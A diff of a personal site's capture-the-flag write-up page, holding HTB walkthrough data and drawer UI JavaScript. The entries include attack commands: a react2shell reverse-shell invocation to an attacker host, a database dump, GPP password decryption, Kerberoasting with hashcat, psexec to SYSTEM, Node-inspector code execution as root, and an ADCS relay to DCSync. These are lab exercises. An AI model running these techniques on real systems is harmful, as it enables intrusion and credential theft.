+          code: "python3 react2shell-poc.py -t http://10.129.10.200:3000 -c \"id\"\npython3 react2shell-poc.py -t http://10.129.10.200:3000 --revshell --lhost 10.10.15.219 --lport 4444"
+        },
+        {
+          phase: "LATERAL MOVEMENT", title: "SQLite Database & Credential Reuse",
+          body: "Found a SQLite DB in the app directory. Dumped and cracked the password hash (reactor1), then SSH'd in as 'engineer'.",
+          code: "python3 react2shell-poc.py -t http://10.129.10.200:3000 -c \"sqlite3 /opt/reactor-app/reactor.db '.dump'\"\n# Cracked: reactor1\nssh engineer@10.129.10.200"
+        },
+        {
+          phase: "PRIVILEGE ESCALATION", title: "Node.js Inspector Exploitation",
+          body: "Root process running Node with --inspect on 127.0.0.1:9229. Tunneled the port locally and connected via Chrome DevTools to execute arbitrary code as root.",
+          code: "ssh -L 9229:127.0.0.1:9229 engineer@10.129.10.200\n# In DevTools console:\nrequire('child_process').execSync('cat /root/root.txt').toString()"
+        }
+      ],
+      flags: [
+        { name: "User Flag", value: "02a3d..." },
+        { name: "Root Flag", value: "9b1e5..." }
+      ]
     },
 
     active: {
-      title: "HTB: Active", 
+      title: "HTB: Active",
       badge: "Windows // Easy",
+      icon: null,
       os: "Windows", diff: "Easy", diffColor: "var(--neon-green)",
-      port: "53, 88, 135, 139, 445, 389, ...", time: "1h 10m", 
-      vector: "GPP Credential Theft → Kerberoasting → SMB Service Execution",
+      port: "53, 88, 135, 139, 389, 445, ...", time: "1h 10m",
+      vector: "GPP Credential Theft → Kerberoasting → SMB Service Execution (SYSTEM)",
       hasFullWriteup: true,
       nodes: [
-        { 
-          phase: "RECONNAISSANCE", 
-          title: "Domain Enumeration", 
-          body: "Initial Nmap scanning identified a Windows Server 2008 R2 Domain Controller. The open SMB and LDAP ports confirmed a classic Active Directory environment. I used 'smbmap' to identify readable shares, finding that 'Replication' was accessible without authentication.", 
-          code: "nmap -sC -sV -p- 10.10.10.100\nsmbmap -H 10.10.10.100" 
-        },
-        { 
-          phase: "INITIAL ACCESS", 
-          title: "GPP Password Recovery", 
-          body: "Within the 'Replication' share, I located a 'Groups.xml' file containing a Group Policy Preference (GPP) password. Because the AES key for these passwords was publicly documented by Microsoft, I decrypted the 'cpassword' to obtain the domain credentials for 'SVC_TGS'.", 
-          code: "smbclient //10.10.10.100/Replication\n# Decrypting the hash:\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
-        },
-        { 
-          phase: "LATERAL MOVEMENT", 
-          title: "Kerberoasting", 
-          body: "Using the 'SVC_TGS' credentials, I performed a Kerberoasting attack. By requesting Service Principal Name (SPN) tickets, I identified that the 'Administrator' account had an extractable service ticket. I saved this ticket to crack it offline.", 
-          code: "GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out\n# Crack the ticket:\nhashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt" 
-        },
-        { 
-          phase: "PRIVILEGE ESCALATION", 
-          title: "SMB Service Execution", 
-          body: "With the Administrator password recovered, I gained full read/write access to the 'C$' and 'ADMIN$' shares. Instead of just grabbing files, I used Impacket's 'psexec.py' to upload a service and execute it, granting me an NT AUTHORITY\SYSTEM shell.", 
-          code: "psexec.py active.htb/administrator@10.10.10.100\nwhoami # nt authority\\system" 
+        {
+          phase: "RECONNAISSANCE", title: "Domain Enumeration",
+          body: "Nmap confirmed Windows Server 2008 R2 Domain Controller. smbmap found the 'Replication' share accessible without authentication.",
+          code: "nmap -sC -sV -p- 10.10.10.100\nsmbmap -H 10.10.10.100"
         },
         {
-          phase: "LESSONS LEARNED",
-          title: "Key Takeaways",
-          body: "1) **GPP are Dangerous:** Storing passwords in Group Policy Preferences is a critical security failure, even if encrypted. 2) **Kerberoasting:** If you have any valid domain user, always hunt for SPNs; they are the path of least resistance to Domain Admin.  3) **SMB is Powerful:** In Windows environments, readable shares (like SYSVOL or Replication) often contain the 'keys to the kingdom' that enable escalation without needing complex RCE exploits."
+          phase: "INITIAL ACCESS", title: "GPP Password Recovery",
+          body: "Groups.xml in the Replication share contained a GPP cpassword. Since Microsoft published the AES key, I decrypted it to obtain domain credentials for SVC_TGS.",
+          code: "smbclient //10.10.10.100/Replication\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+        },
+        {
+          phase: "LATERAL MOVEMENT", title: "Kerberoasting",
+          body: "With SVC_TGS credentials, requested SPN tickets via GetUserSPNs.py. Found an extractable ticket for the Administrator account. Cracked offline with hashcat.",
+          code: "GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out\nhashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          phase: "PRIVILEGE ESCALATION", title: "SMB Service Execution → SYSTEM",
+          body: "Administrator password recovered. Used psexec.py to upload a service binary and execute it, getting NT AUTHORITY\\SYSTEM shell.",
+          code: "psexec.py active.htb/administrator@10.10.10.100\nwhoami\n# nt authority\\system"
+        },
+        {
+          phase: "LESSONS LEARNED", title: "Key Takeaways",
+          body: "1) GPP passwords are critical failures — the AES key is public. 2) If you have any valid domain user, always enumerate SPNs for Kerberoasting. 3) Readable SYSVOL/Replication shares are goldmines that often skip the need for complex RCE."
         }
       ],
-      flag: "User: 86d67d8b... | Root: b5fc76d1..."
+      flags: [
+        { name: "User Flag", value: "86d67d8b..." },
+        { name: "Root Flag", value: "b5fc76d1..." }
+      ]
     },
 
-    DummyData1: {
-      title: "DummyData", badge: "Challenge // Hard",
+    cryptoforge: {
+      title: "CryptoForge Matrix",
+      badge: "Challenge // Hard",
+      icon: null,
       os: "N/A", diff: "Hard", diffColor: "#f59e0b",
-      port: "—", time: "~2h", vector: "CBC IV Reuse → Bit-flip Forgery",
+      port: "—", time: "~2h",
+      vector: "CBC IV Reuse → Known-Plaintext → Bit-flip Token Forgery",
       hasFullWriteup: false,
       nodes: [
         {
           phase: "ANALYSIS", title: "IV Reuse Detected",
-          body: "Two ciphertexts encrypted under the same key+IV are XOR'd, cancelling the key and leaking XOR of plaintexts.",
-          code: `C1 = AES_CBC(K, IV, P1)\nC2 = AES_CBC(K, IV, P2)\n<span style="color:var(--neon-cyan)">C1 XOR C2 = P1 XOR P2</span>  <span style="color:var(--text-dark)"># key cancels out</span>`
+          body: "Two ciphertexts encrypted under the same key+IV. XOR-ing them cancels the key, leaking XOR of plaintexts.",
+          code: "C1 = AES_CBC(K, IV, P1)\nC2 = AES_CBC(K, IV, P2)\n# C1 XOR C2 = P1 XOR P2  (key cancels out)"
         },
         {
           phase: "EXPLOITATION", title: "Bit-flip Token Forgery",
-          body: "Known-plaintext attack against the first block. Flipping specific ciphertext bits produces a forged admin session token.",
-          code: `<span style="color:var(--text-dark)"># flip bit at position i</span>\n<span style="color:var(--neon-purple)">forged_ct[i] ^= (original_byte ^ target_byte)</span>\n\n<span style="color:var(--neon-green)">[✓] Admin session token forged.</span>`
+          body: "Known-plaintext attack on the first block. Flipping ciphertext bits at calculated offsets produces a forged admin session token.",
+          code: "# Flip bit at position i:\nforged_ct[i] ^= (original_byte ^ target_byte)\n# [✓] Admin session token forged."
         }
       ]
     },
 
-    DummyData2: {
-      title: "DummyData", badge: "Windows // Insane",
+    syncnode: {
+      title: "ActiveDirectory SyncNode",
+      badge: "Windows // Insane",
+      icon: null,
       os: "Windows", diff: "Insane", diffColor: "#ef4444",
-      port: "445, 88, 389", time: "~4h", vector: "ADCS ESC8 → Domain Admin",
+      port: "445, 88, 389", time: "~4h",
+      vector: "ADCS ESC8 → NTLM Relay → PKINIT → DCSync → Domain Admin",
       hasFullWriteup: false,
       nodes: [
         {
           phase: "ENUMERATION", title: "Certipy — ADCS Template Scan",
           body: "Vulnerable certificate template allows any domain user to enroll with an arbitrary SAN, including Domain Admin UPN.",
-          code: `<span style="color:var(--neon-purple)"># certipy find -u user@domain -p Pass -dc-ip 10.10.11.X</span>\n<span style="color:var(--neon-cyan)">Template: UserTemplate</span>\n<span style="color:#f59e0b">[!] ESC1 — SAN can be specified by enrollee</span>`
+          code: "certipy find -u user@domain -p Pass -dc-ip 10.10.11.X\n# Template: UserTemplate\n# [!] ESC1 — SAN can be specified by enrollee"
         },
         {
           phase: "EXPLOITATION", title: "ESC8 — NTLM Relay to ADCS Web Enrollment",
-          body: "NTLM relay against the HTTP cert enrollment endpoint. Domain Controller certificate issued, used to obtain TGT via PKINIT.",
-          code: `<span style="color:var(--text-dark)"># ntlmrelayx → /certsrv/certfnsh.asp</span>\n<span style="color:var(--neon-green)">Certificate issued for DC$@domain.local</span>\n<span style="color:var(--neon-purple)"># DCSync → all domain hashes extracted</span>`
+          body: "NTLM relay to /certsrv/certfnsh.asp issued a Domain Controller certificate. Used with PKINIT to get DC TGT, then DCSync'd all hashes.",
+          code: "# ntlmrelayx → /certsrv/certfnsh.asp\n# Certificate issued for DC$@domain.local\n# DCSync → all domain hashes extracted"
         }
       ]
     }
@@ -430,107 +621,138 @@
   </script>
 
   <script>
-    let activeCard = null;
+    let activeCard   = null;
     let activeDrawer = null;
 
     function openDrawer(cardEl, machineId) {
-        // 1. Toggle off if same card clicked
-        if (activeCard === cardEl) { closeDrawer(); return; }
-    
-        // 2. Clear existing
-        if (activeDrawer) { activeDrawer.remove(); activeDrawer = null; }
-        if (activeCard) { activeCard.classList.remove('selected'); activeCard = null; }
-    
-        // 3. Set new active
-        activeCard = cardEl;
-        cardEl.classList.add('selected');
-    
-        const d = WRITEUP_DATA[machineId];
-        if (!d) return;
-    
-        // 4. Build timeline nodes
-        const nodesHtml = (d.nodes || []).map(n => `
-            <div class="timeline-node">
-                <div class="timeline-time">${n.phase}</div>
-                <div class="timeline-title">${n.title}</div>
-                <p style="color:var(--text-muted);font-size:0.9rem;line-height:1.55;margin-bottom:0">${n.body}</p>
-                ${n.code ? `<div class="terminal-window" style="color:var(--neon-cyan);">${n.code}</div>` : ''}
+      // Toggle: same card closes it
+      if (activeCard === cardEl) { closeDrawer(); return; }
+
+      // Tear down previous
+      if (activeDrawer) { activeDrawer.remove(); activeDrawer = null; }
+      if (activeCard)   { activeCard.classList.remove('selected'); activeCard = null; }
+
+      activeCard = cardEl;
+      cardEl.classList.add('selected');
+
+      const d = WRITEUP_DATA[machineId];
+      if (!d) return;
+
+      // ── Timeline nodes ──
+      const nodesHtml = (d.nodes || []).map(n => `
+        <div class="timeline-node">
+          <div class="timeline-time">${n.phase}</div>
+          <div class="timeline-title">${n.title}</div>
+          <p style="color:var(--text-muted);font-size:0.9rem;line-height:1.6;margin:6px 0 0;">${n.body}</p>
+          ${n.code ? `<div class="terminal-window">${n.code}</div>` : ''}
+        </div>
+      `).join('');
+
+      // ── Flag vault ──
+      const flagsHtml = (d.flags && d.flags.length) ? `
+        <div class="timeline-node">
+          <div class="timeline-title" style="margin-bottom:12px;">Flag Vault</div>
+          ${d.flags.map(f => `
+            <div style="margin-bottom:8px;">
+              <div style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dark);margin-bottom:4px;">${f.name}</div>
+              <div class="flag-row">
+                <span class="flag-blurred-mask" style="font-family:var(--font-mono);font-size:0.9rem;filter:blur(4px);opacity:0.25;">${f.value}</span>
+                <button class="tab-btn" style="padding:5px 12px;font-size:0.75rem;cursor:pointer;"
+                        onclick="revealFlag(this,'${f.value}')">Reveal</button>
+              </div>
             </div>
-        `).join('');
-    
-        const flagHtml = d.flag ? `
-            <div class="timeline-node">
-                <div class="timeline-title">Root Operational Flag Vault</div>
-                <div class="panel-card" style="background:rgba(168,85,247,0.03);padding:15px;display:flex;justify-content:space-between;align-items:center;border-radius:8px;border:1px solid rgba(168,85,247,0.1);">
-                    <div style="font-family:var(--font-mono);font-size:0.9rem;">
-                        <span class="flag-blurred-mask" style="filter:blur(4px);opacity:0.2;">${d.flag}</span>
-                    </div>
-                    <button class="tab-btn active" style="padding:6px 12px;font-size:0.75rem;cursor:pointer;" onclick="revealTargetFlag(this,'${d.flag}')">Reveal Flag</button>
-                </div>
-            </div>
-        ` : '';
-    
-        const fullLink = d.hasFullWriteup
-            ? `<a href="target-logs.html?machine=${machineId}" style="display:inline-flex;align-items:center;gap:8px;margin-top:20px;font-family:var(--font-mono);font-size:0.8rem;color:var(--neon-purple);border:var(--border-purple);padding:8px 16px;border-radius:8px;background:rgba(168,85,247,0.06);text-decoration:none;">OPEN FULL REPORT ↗</a>`
-            : `<div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-dark);margin-top:16px;">// Full writeup coming soon</div>`;
-    
-        // 5. Create Drawer
-        const drawer = document.createElement('div');
-        drawer.className = 'wu-drawer open';
-        drawer.innerHTML = `
-            <button class="drawer-close" onclick="closeDrawer()">✕ CLOSE</button>
-            <img src="${d.icon}" class="card-icon" alt="Machine Icon">
-            <div class="page-header" style="padding-top:0; margin-bottom:24px;">
-                <div class="sys-badge" style="color:${d.diffColor}; border-color:${d.diffColor}33;">${d.badge}</div>
-                <h2 style="font-size:2rem;font-weight:700;margin-top:8px;">${d.title}</h2>
-            </div>
-            <div class="about-layout">
-                <div class="about-sidebar">
-                    <div class="terminal-string">// TELEMETRY</div>
-                    <p style="color:var(--text-muted);font-size:0.88rem;line-height:2;font-family:var(--font-mono);">
-                        TIME // ${d.time}<br>OS // ${d.os}<br>PORT // ${d.port}
-                    </p>
-                    <div class="terminal-string" style="margin-top:16px;">// VECTOR</div>
-                    <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--neon-purple);line-height:1.6;">${d.vector}</p>
-                    ${fullLink}
-                </div>
-                <div class="timeline">
-                    ${nodesHtml}
-                    ${flagHtml}
-                </div>
-            </div>
-        `;
-    
-        // FIX: Append to the Grid container, not the card itself, to ensure full width
-        const grid = document.getElementById('wu-grid');
-        grid.insertAdjacentElement('afterend', drawer);
-        
-        activeDrawer = drawer;
-        setTimeout(() => drawer.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 100);
+          `).join('')}
+        </div>
+      ` : '';
+
+      // ── Full report link ──
+      const fullLink = d.hasFullWriteup
+        ? `<a href="target-logs.html?machine=${machineId}" style="display:inline-flex;align-items:center;gap:8px;margin-top:20px;font-family:var(--font-mono);font-size:0.8rem;color:var(--neon-purple);border:var(--border-purple);padding:8px 16px;border-radius:8px;background:rgba(168,85,247,0.06);text-decoration:none;">OPEN FULL REPORT ↗</a>`
+        : `<div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-dark);margin-top:16px;">// Full writeup coming soon</div>`;
+
+      // ── Machine icon (optional) ──
+      const iconHtml = (d.icon)
+        ? `<img src="${d.icon}" class="drawer-icon" alt="${d.title} icon">`
+        : '';
+
+      // ── Build drawer ──
+      const drawer = document.createElement('div');
+      drawer.className = 'wu-drawer open';
+      drawer.innerHTML = `
+        <button class="drawer-close" onclick="closeDrawer()">✕ CLOSE</button>
+        ${iconHtml}
+        <div class="page-header" style="padding-top:0;margin-bottom:24px;padding-bottom:16px;">
+          <div class="sys-badge" style="color:${d.diffColor};border-color:${d.diffColor}33;">${d.badge}</div>
+          <h2 style="font-size:1.9rem;font-weight:700;margin-top:8px;letter-spacing:-0.5px;">${d.title}</h2>
+        </div>
+        <div class="drawer-inner">
+          <div class="drawer-sidebar">
+            <div class="terminal-string">// TELEMETRY</div>
+            <p style="color:var(--text-muted);font-size:0.85rem;line-height:2.1;font-family:var(--font-mono);">
+              TIME&nbsp;&nbsp;// ${d.time}<br>
+              OS&nbsp;&nbsp;&nbsp;&nbsp;// ${d.os}<br>
+              PORT&nbsp;&nbsp;// ${d.port}
+            </p>
+            <div class="terminal-string" style="margin-top:18px;">// VECTOR</div>
+            <p style="font-family:var(--font-mono);font-size:0.82rem;color:var(--neon-purple);line-height:1.7;">${d.vector}</p>
+            ${fullLink}
+          </div>
+          <div class="drawer-timeline">
+            ${nodesHtml}
+            ${flagsHtml}
+          </div>
+        </div>
+      `;
+
+      // Inject into the dedicated slot (outside the grid)
+      const slot = document.getElementById('wu-drawer-slot');
+      slot.innerHTML = '';
+      slot.appendChild(drawer);
+      activeDrawer = drawer;
+
+      // Update URL hash without reloading
+      history.replaceState(null, '', '#' + machineId);
+
+      setTimeout(() => drawer.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 80);
     }
 
     function closeDrawer() {
       if (activeDrawer) { activeDrawer.remove(); activeDrawer = null; }
       if (activeCard)   { activeCard.classList.remove('selected'); activeCard = null; }
+      history.replaceState(null, '', window.location.pathname);
     }
 
-    // reuse your existing helpers
-    function toggleTaskAnswer(btn, answer) {
-      btn.innerText = answer;
-      btn.style.background = "var(--neon-green)";
-      btn.style.color = "#000";
-    }
-    function revealTargetFlag(btn, flag) {
-      const mask = btn.previousElementSibling.querySelector('.flag-blurred-mask');
+    // ── Open drawer from URL hash on page load ──
+    // e.g. visiting writeups.html#reactor auto-opens that drawer
+    window.addEventListener('DOMContentLoaded', function() {
+      const hash = window.location.hash.replace('#', '');
+      if (hash) {
+        const card = document.getElementById(hash);
+        if (card && WRITEUP_DATA[hash]) {
+          openDrawer(card, hash);
+        }
+      }
+    });
+
+    // ── Flag reveal ──
+    function revealFlag(btn, flagValue) {
+      const mask = btn.parentElement.querySelector('.flag-blurred-mask');
       if (mask) {
-        mask.innerText = flag;
-        mask.style.filter = "none";
-        mask.style.opacity = "1";
-        btn.style.display = "none";
+        mask.textContent = flagValue;
+        mask.style.filter  = 'none';
+        mask.style.opacity = '1';
+        btn.style.display  = 'none';
       }
     }
 
-    // Filtering
+    // ── Task answer (kept for target-logs.html compatibility) ──
+    function toggleTaskAnswer(btn, answer) {
+      btn.innerText = answer;
+      btn.style.background = 'var(--neon-green)';
+      btn.style.color = '#000';
+    }
+
+    // ── Filter pills ──
     document.querySelectorAll('.filter-pill').forEach(pill => {
       pill.addEventListener('click', function() {
         document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
@@ -538,7 +760,9 @@
         closeDrawer();
         const f = this.dataset.filter;
         document.querySelectorAll('#wu-grid .bento-box').forEach(card => {
-          const show = f === 'all' || card.dataset.difficulty === f || (card.dataset.tags||'').includes(f);
+          const diff = (card.dataset.difficulty || '').toLowerCase();
+          const tags = (card.dataset.tags || '').toLowerCase();
+          const show = f === 'all' || diff === f || tags.includes(f);
           card.style.display = show ? '' : 'none';
         });
       });
@@ -547,4 +771,3 @@
 
 </body>
 </html>
-
